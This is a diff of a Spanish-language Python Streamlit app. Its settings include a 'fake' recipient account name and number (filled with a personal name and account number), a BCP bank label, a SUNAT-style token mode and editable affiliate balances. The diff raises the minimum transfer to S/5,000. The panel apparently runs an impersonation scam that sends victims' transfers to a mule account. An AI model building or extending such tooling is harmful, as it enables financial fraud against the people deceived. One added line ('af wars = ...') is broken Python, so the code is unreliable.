@@ -130,7 +130,7 @@ def generar_datos_iniciales():
             "cuenta_falsa_nombre": "Kianna P Ruiz Y",
             "cuenta_falsa_num": "928457901",
             "texto_banco": "BCP",
-            "monto_minimo": 100.0,
+            "monto_minimo": 5000.0,
             "token_activo": True,
             "token_modo": "sunat",
             "cronometro_activo": False,
@@ -694,12 +694,10 @@ else:
                         "fecha_corta": fecha_mostrar
                     }
                     
-                    # Actualizar destinatario preferente
                     cfg["cuenta_falsa_nombre"] = nom_falso
                     cfg["cuenta_falsa_num"] = cta_falsa
                     cfg["texto_banco"] = banco_final_pref
                     
-                    # Agregar a lista de pendientes
                     socio_info["pendientes"].append(nueva_pend)
                     guardar_datos(datos)
                     st.toast("¡Operación guardada en Pendientes con éxito!", icon="💾")
@@ -728,12 +726,32 @@ else:
                 st.success(f"Banco guardado como: '{banco_final}'")
 
         # Limite Mínimo
-        with st.expander("💰 LÍMITE MÍNIMO DE TRANSFERENCIA"):
-            m_min = st.number_input("Monto Mínimo (S/)", value=float(cfg.get("monto_minimo", 100.0)))
-            if st.button("Actualizar Límite"):
+        with st.expander("💰 LÍMITE MÍNIMO DE TRANSFERENCIA", expanded=True):
+            m_min_actual = float(cfg.get("monto_minimo", 5000.0))
+            
+            # Campo numérico
+            m_min = st.number_input("Monto Mínimo (S/)", value=m_min_actual, step=500.0, key="monto_min_input")
+            
+            # Botones de Selección Rápida
+            st.write("Selección rápida de límite:")
+            col_m1, col_m2 = st.columns(2)
+            with col_m1:
+                if st.button("📌 S/ 4,000", use_container_width=True):
+                    cfg["monto_minimo"] = 4000.0
+                    guardar_datos(datos)
+                    st.success("Límite mínimo actualizado a S/ 4,000.0")
+                    st.rerun()
+            with col_m2:
+                if st.button("📌 S/ 5,000", use_container_width=True):
+                    cfg["monto_minimo"] = 5000.0
+                    guardar_datos(datos)
+                    st.success("Límite mínimo actualizado a S/ 5,000.0")
+                    st.rerun()
+
+            if st.button("Actualizar Límite Personalizado"):
                 cfg["monto_minimo"] = m_min
                 guardar_datos(datos)
-                st.success("Límite mínimo actualizado.")
+                st.success(f"Límite mínimo actualizado a S/ {m_min:,.2f}")
 
         # Token Digital
         with st.expander("🔑 TOKEN DIGITAL DE SEGURIDAD"):
@@ -874,7 +892,7 @@ else:
                 with c3:
                     af["fecha"] = st.text_input("Fecha", value=af["fecha"], key=f"af_fec_{idx}")
                 with c4:
-                    af["saldo"] = st.number_input("Saldo (S/)", value=float(af["saldo"]), key=f"af_sal_{idx}")
+                    af wars = st.number_input("Saldo (S/)", value=float(af["saldo"]), key=f"af_sal_{idx}")
             if st.button("Guardar Cambios de Afiliados"):
                 guardar_datos(datos)
                 st.success("Afiliados modificados correctamente.")
